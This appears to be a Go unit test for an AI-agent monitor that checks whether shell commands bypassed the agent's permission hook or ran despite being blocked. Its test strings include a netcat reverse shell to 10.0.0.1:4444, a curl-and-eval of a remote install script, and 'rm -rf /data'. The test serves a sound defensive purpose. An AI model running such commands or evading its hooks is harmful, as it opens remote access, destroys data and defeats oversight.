package correlate

import (
	"testing"

	"xmonitor/internal/event"
	"xmonitor/internal/toolclass"
)

func intentEv(sess, cmd string, dec event.Action) *event.Event {
	return &event.Event{
		Kind: event.KindIntent, Session: sess, Decision: dec, ToolCallID: "t1",
		Tool: &event.Tool{Raw: "Bash", Class: toolclass.ExecShell, Args: map[string]any{"command": cmd}},
	}
}

func TestBypassDetection(t *testing.T) {
	var alerts []*event.Event
	c := New(func(e *event.Event) { alerts = append(alerts, e) })

	// exec with no prior intent -> bypass
	if a := c.NoteExec("s1", "nc -e /bin/sh 10.0.0.1 4444"); a == nil || a.Type != "hook_bypass" {
		t.Fatalf("expected bypass, got %+v", a)
	}
	// infra noise ignored
	if a := c.NoteExec("s1", "git status"); a != nil {
		t.Fatalf("infra noise should not alert: %+v", a)
	}
	// matching allowed intent -> no alert (probe sees wrapped eval form)
	c.NoteIntent(intentEv("s2", "curl https://example.com/install.sh", event.ActionAllow))
	if a := c.NoteExec("s2", "bash -c 'eval curl https://example.com/install.sh'"); a != nil {
		t.Fatalf("matched intent should not alert: %+v", a)
	}
	// blocked intent that still executed -> critical
	c.NoteIntent(intentEv("s3", "rm -rf /data", event.ActionBlock))
	a := c.NoteExec("s3", "rm -rf /data")
	if a == nil || a.Type != "blocked_but_executed" || a.Risk != event.RiskCritical {
		t.Fatalf("expected critical, got %+v", a)
	}
}
